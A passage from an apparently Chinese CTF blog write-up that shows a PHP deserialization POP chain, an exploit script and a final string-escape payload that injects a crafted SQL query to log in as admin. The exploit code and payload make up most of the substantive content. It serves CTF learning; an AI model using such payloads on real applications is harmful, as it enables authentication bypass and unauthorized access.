+<p><img src="/images/image-20210925003354482.png" alt="image-20210925003354482"></p>
+<p>这里有一个很明显的echo，所以整条链子都清楚了。</p>
+<p>UpdateHelper-&gt;__destruct==&gt;User-&gt;__toString==&gt;Info-&gt;__call==&gt;dbCtrl-&gt;login</p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>给出exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> UpdateHelper());</span><br><span class="line"><span class="comment">// 这里还需要通过上面的replace来进行字符串逃逸。</span></span><br></pre></td></tr></table></figure>
+
+<p>最终的payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age=<span class="number">1</span>&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:70:&quot;</span>select <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="keyword">from</span> user where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/09/30/bestphp-s-revenge/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">bestphp&#39;s_revenge</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/09/24/xctf-stack2/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">xctf_stack2</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="nav-text">获取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="nav-text">扫目录</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0pop%E9%93%BE"><span class="nav-text">构造pop链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-text">解题</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
